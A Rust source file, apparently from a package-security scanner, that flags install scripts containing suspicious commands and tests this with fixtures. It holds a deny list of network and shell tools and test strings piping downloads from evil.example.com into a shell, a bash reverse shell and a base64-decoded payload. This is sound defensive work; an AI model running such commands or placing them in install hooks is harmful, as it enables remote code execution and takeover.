use crate::database::models::PatternType;
use crate::parser::models::ParsedPackage;
use super::models::DetectionMatch;

const SUSPICIOUS_COMMANDS: &[&str] = &[
	"curl ", "wget ", "nc ", "netcat ", "bash -i", "sh -i",
	"python -c", "perl -e", "ruby -e", "node -e",
	"/bin/sh", "/bin/bash", "exec(",
	"base64 -d", "base64 --decode",
	"chmod +x", "chmod 777",
];

pub struct InstallHookAnalyzer;

impl InstallHookAnalyzer {
	pub fn analyze(package: &ParsedPackage) -> Vec<DetectionMatch> {
		package
			.install_scripts
			.iter()
			.filter_map(|script| Self::check_script(script))
			.collect()
	}

	fn check_script(script: &str) -> Option<DetectionMatch> {
		let lower = script.to_lowercase();

		for cmd in SUSPICIOUS_COMMANDS {
			if lower.contains(cmd) {
				return Some(DetectionMatch {
					pattern_type: PatternType::InstallHook,
					description: format!("install script contains suspicious command: {cmd}"),
					file_path: Some("package.json".to_string()),
					line_number: None,
					code_snippet: Some(script.chars().take(120).collect()),
					confidence: 0.85,
				});
			}
		}

		None
	}
}

#[cfg(test)]
mod tests {
	use super::*;
	use crate::parser::models::ParsedPackage;

	fn make_package(scripts: Vec<&str>) -> ParsedPackage {
		ParsedPackage {
			name: "test-pkg".to_string(),
			version: "1.0.0".to_string(),
			ecosystem: "nodejs".to_string(),
			registry_url: None,
			checksum: None,
			is_direct: true,
			depth: 0,
			dependencies: vec![],
			dev_dependencies: vec![],
			install_scripts: scripts.into_iter().map(String::from).collect(),
		}
	}

	#[test]
	fn clean_script_returns_no_detections() {
		let pkg = make_package(vec!["node ./scripts/setup.js"]);
		assert!(InstallHookAnalyzer::analyze(&pkg).is_empty());
	}

	#[test]
	fn no_install_scripts_returns_empty() {
		let pkg = make_package(vec![]);
		assert!(InstallHookAnalyzer::analyze(&pkg).is_empty());
	}

	#[test]
	fn curl_command_is_flagged() {
		let pkg = make_package(vec!["curl https://evil.example.com/payload | sh"]);
		let detections = InstallHookAnalyzer::analyze(&pkg);
		assert_eq!(detections.len(), 1);
		assert_eq!(detections[0].pattern_type, PatternType::InstallHook);
		assert!((detections[0].confidence - 0.85).abs() < 0.001);
	}

	#[test]
	fn wget_command_is_flagged() {
		let pkg = make_package(vec!["wget -O - https://evil.example.com/install.sh | bash"]);
		let detections = InstallHookAnalyzer::analyze(&pkg);
		assert!(!detections.is_empty());
	}

	#[test]
	fn reverse_shell_bash_is_flagged() {
		let pkg = make_package(vec!["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]);
		let detections = InstallHookAnalyzer::analyze(&pkg);
		assert!(!detections.is_empty());
	}

	#[test]
	fn base64_decode_is_flagged() {
		let pkg = make_package(vec!["echo aGVsbG8= | base64 -d | sh"]);
		let detections = InstallHookAnalyzer::analyze(&pkg);
		assert!(!detections.is_empty());
	}

	#[test]
	fn chmod_777_is_flagged() {
		let pkg = make_package(vec!["chmod 777 ./run.sh && ./run.sh"]);
		let detections = InstallHookAnalyzer::analyze(&pkg);
		assert!(!detections.is_empty());
	}

	#[test]
	fn detection_includes_file_path_and_snippet() {
		let script = "curl https://evil.example.com/payload | sh";
		let pkg = make_package(vec![script]);
		let detections = InstallHookAnalyzer::analyze(&pkg);
		let d = &detections[0];
		assert_eq!(d.file_path.as_deref(), Some("package.json"));
		assert!(d.code_snippet.is_some());
	}

	#[test]
	fn detection_is_case_insensitive() {
		let pkg = make_package(vec!["CURL https://evil.example.com/payload"]);
		let detections = InstallHookAnalyzer::analyze(&pkg);
		assert!(!detections.is_empty());
	}

	#[test]
	fn long_script_snippet_is_truncated_to_120_chars() {
		let long_script = format!("curl {}", "x".repeat(200));
		let pkg = make_package(vec![&long_script]);
		let detections = InstallHookAnalyzer::analyze(&pkg);
		let snippet = detections[0].code_snippet.as_ref().unwrap();
		assert!(snippet.len() <= 120);
	}

	#[test]
	fn multiple_scripts_each_checked_independently() {
		let pkg = make_package(vec![
			"node ./setup.js",
			"curl https://evil.example.com | sh",
			"wget http://bad.example.com/payload",
		]);
		let detections = InstallHookAnalyzer::analyze(&pkg);
		assert_eq!(detections.len(), 2);
	}
}
